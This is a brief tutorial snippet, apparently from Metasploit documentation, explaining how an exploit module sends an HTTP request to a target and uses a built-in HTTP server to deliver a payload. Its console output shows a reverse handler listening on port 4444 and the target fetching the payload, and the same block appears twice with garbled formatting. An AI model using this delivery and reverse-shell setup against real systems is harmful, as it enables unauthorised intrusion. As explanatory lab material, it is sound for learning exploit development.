### Today's lesson: Send a HTTP request to attack the target machine, and use a HttpServer for payload delivery.
Here is how you can set it up:
```msf
msf exploit(test) > run
[*] Exploit running as background job.

[*] Started reverse handler on 10.0.1.76:4444 
[*] Using URL: http://0.0.0.0:8080/SUuv1qjZbCibL80
[*]  Local IP: http://10.0.1.76:8080/SUuv1qjZbCibL80
[*] Server started.
[*] Sending a malicious request to /
msf exploit(test) >
[*] 10.0.1.76        test - 10.0.1.76:8181 - Payload request received: /SUuv1qjZbCibL80
[*] Server stopped.

msf exploit(test) >
```

`msf
msf exploit(test) > run
[*] Exploit running as background job.

[*] Started reverse handler on 10.0.1.76:4444 
[*] Using URL: http://0.0.0.0:8080/SUuv1qjZbCibL80
[*]  Local IP: http://10.0.1.76:8080/SUuv1qjZbCibL80
[*] Server started.
[*] Sending a malicious request to /
msf exploit(test) >
[*] 10.0.1.76        test - 10.0.1.76:8181 - Payload request received: /SUuv1qjZbCibL80
[*] Server stopped.

msf exploit(test) >
`

